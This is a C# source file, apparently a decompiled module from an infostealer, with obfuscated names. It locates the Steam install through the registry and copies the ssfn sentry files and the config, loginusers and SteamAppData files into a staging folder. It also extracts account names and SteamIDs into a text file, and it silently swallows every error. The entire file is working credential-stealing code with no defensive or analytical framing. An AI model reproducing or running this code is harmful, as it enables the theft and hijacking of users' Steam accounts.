using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

internal class al
{
	public static int a = 0;

	private static string m_b;

	public static List<string> c = new List<string>();

	public static void a(string @is)
	{
		b();
		c(@is + "\\Steam\\");
		for (int i = 0; i < al.c.Count; i++)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(al.c[i]);
				Directory.CreateDirectory(@is + "\\Steam");
				File.Copy(al.c[i], @is + "\\Steam\\" + fileInfo.Name);
				al.a++;
			}
			catch
			{
			}
		}
	}

	private static void b()
	{
		try
		{
			al.m_b = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Valve\\Steam").GetValue("InstallPath").ToString();
		}
		catch (NullReferenceException)
		{
			al.m_b = "";
		}
	}

	private static void c(string it)
	{
		try
		{
			if (al.m_b != "")
			{
				string[] files = Directory.GetFiles(al.m_b, "ssfn*");
				foreach (string text in files)
				{
					if (new FileInfo(text).Length == 2048)
					{
						al.c.Add(text);
					}
				}
				files = new string[3]
				{
					"\\config\\config.vdf",
					"\\config\\loginusers.vdf",
					"\\config\\SteamAppData.vdf"
				};
				foreach (string str in files)
				{
					al.c.Add(al.m_b + str);
				}
				d(it);
			}
		}
		catch
		{
		}
	}

	private static void d(string iu)
	{
		try
		{
			string path = al.m_b + "\\config\\config.vdf";
			string path2 = iu + "\\steamids.txt";
			string[] value = File.ReadAllLines(path);
			Regex regex = new Regex("\"\\w+?\",\t\t\t\t\t{,\t\t\t\t\t\t\"SteamID\"\t\t\"\\d{17}\",\t\t\t\t\t},");
			string input = string.Join(",", value);
			MatchCollection matchCollection = regex.Matches(input);
			for (int i = 0; i < matchCollection.Count; i++)
			{
				File.AppendAllText(path2, e(matchCollection[i].Value, "\"", "\",\t\t\t\t\t{,", 0, StringComparison.Ordinal)[0] + " | http://steamcommunity.com/profiles/" + e(matchCollection[i].Value, "\"SteamID\"\t\t\"", "\",", 0, StringComparison.Ordinal)[0] + Environment.NewLine);
			}
		}
		catch
		{
		}
	}

	private static string[] e(string iv, string iw, string ix, int iy, StringComparison iz)
	{
		if (string.IsNullOrEmpty(iv))
		{
			return new string[0];
		}
		if (iw == null)
		{
			throw new ArgumentNullException("left");
		}
		if (iw.Length == 0)
		{
			throw new ArgumentNullException("left");
		}
		if (ix == null)
		{
			throw new ArgumentNullException("right");
		}
		if (ix.Length == 0)
		{
			throw new Exception("right");
		}
		if (iy < 0)
		{
			throw new Exception("startIndex");
		}
		if (iy >= iv.Length)
		{
			throw new ArgumentOutOfRangeException("startIndex");
		}
		int startIndex = iy;
		List<string> list = new List<string>();
		while (true)
		{
			int num = iv.IndexOf(iw, startIndex, iz);
			if (num == -1)
			{
				break;
			}
			int num2 = num + iw.Length;
			int num3 = iv.IndexOf(ix, num2, iz);
			if (num3 == -1)
			{
				break;
			}
			int length = num3 - num2;
			list.Add(iv.Substring(num2, length));
			startIndex = num3 + ix.Length;
		}
		return list.ToArray();
	}
}
